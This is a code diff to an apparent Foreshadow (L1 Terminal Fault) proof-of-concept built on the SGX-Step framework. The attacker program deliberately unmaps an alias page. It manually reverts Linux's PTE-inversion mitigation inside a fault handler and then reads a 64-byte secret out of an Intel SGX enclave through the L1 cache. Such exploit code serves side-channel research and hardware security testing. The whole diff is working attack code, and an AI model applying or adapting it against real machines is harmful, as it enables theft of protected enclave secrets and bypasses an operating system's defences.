@@ -32,8 +32,9 @@
 #include "libsgxstep/foreshadow.h"
 #include "libsgxstep/cache.h"
 
+#define USE_TSX             1
 #define DUMP_SSA            0
-#define ITER_RELOAD         0
+#define ITER_RELOAD         1
 #define SECRET_BYTES        64      /* read entire cache line */
 
 #define DEBUG_ENCLAVE	    1
@@ -42,20 +43,13 @@
 #define ENCLAVE_SO	"Enclave/encl.so"
 #define ENCLAVE_MODE 	DEBUG_ENCLAVE
 
-void *secret_ptr = NULL;
-void *secret_page = NULL;
-void *alias_ptr = NULL;
-uint64_t *pte_alias_secret = NULL;
-
-void *ssa_gprsgx = NULL;
-void *alias_ssa_gprsgx = NULL;
-uint64_t *pte_alias_gprsgx = NULL;
+void *secret_ptr = NULL, *secret_page = NULL, *alias_ptr = NULL, *ssa_gprsgx = NULL, *alias_ssa_gprsgx = NULL;
+uint64_t *pte_alias = NULL, *pte_alias_gprsgx = NULL;
+uint64_t pte_alias_unmapped = 0x0;
 
 gprsgx_region_t shadow_gprsgx = {0x00};
 
-int fault_fired = 0;
-int cur_byte = 0;
-
+int fault_fired = 0, cur_byte = 0;
 sgx_enclave_id_t eid = 0;
 
 /* ================== ATTACKER IRQ/FAULT HANDLERS ================= */
@@ -64,6 +58,10 @@ sgx_enclave_id_t eid = 0;
 void fault_handler(int signal)
 {
     fault_fired++;
+
+    /* remap enclave page, so abort page semantics apply and execution can continue. */
+    *pte_alias = MARK_PRESENT(pte_alias_unmapped);
+    ASSERT( !mprotect( (void*) (((uint64_t) alias_ptr) & ~PFN_MASK), 0x1000, PROT_READ | PROT_WRITE));
 
     #if DUMP_SSA
         if ( !(cur_byte = foreshadow_ssa(&shadow_gprsgx, alias_ssa_gprsgx)) )
@@ -95,6 +93,15 @@ void attacker_config_runtime(void)
     print_enclave_info();
 }
 
+void unmap_alias(void)
+{
+    /* NOTE: we use mprotect so Linux is aware we unmapped the page and
+     * delivers the exception to our user space handler, but we revert PTE
+     * inversion mitgation manually afterwards */
+    ASSERT( !mprotect( (void*) (((uint64_t) alias_ptr) & ~PFN_MASK), 0x1000, PROT_NONE ));
+    *pte_alias = pte_alias_unmapped;
+}
+
 void attacker_config_page_table(void)
 {
     /* benchmark enclave trigger page and SSA frame addresses */
@@ -108,9 +115,10 @@ void attacker_config_page_table(void)
     print_pte_adrs(secret_ptr);
 
     /* ensure a #PF on trigger accesses through the *alias* mapping */
-    ASSERT( pte_alias_secret = remap_page_table_level( alias_ptr, PTE) );
-    *pte_alias_secret = MARK_NOT_PRESENT(*pte_alias_secret);
-    print_pte(pte_alias_secret);
+    ASSERT( pte_alias = remap_page_table_level( alias_ptr, PTE) );
+    pte_alias_unmapped = MARK_NOT_PRESENT(*pte_alias);
+    unmap_alias();
+    print_pte(pte_alias);
 
     #if DUMP_SSA
         ssa_gprsgx = get_enclave_ssa_gprsgx_adrs();
@@ -157,6 +165,9 @@ int main( int argc, char **argv )
     info("extracting secret from L1 cache..");
     for (i=0; i < SECRET_BYTES; i++)
     {
+        #if !USE_TSX
+            unmap_alias();
+        #endif
         #if ITER_RELOAD
             SGX_ASSERT( enclave_reload( eid, secret_ptr ) );
         #endif
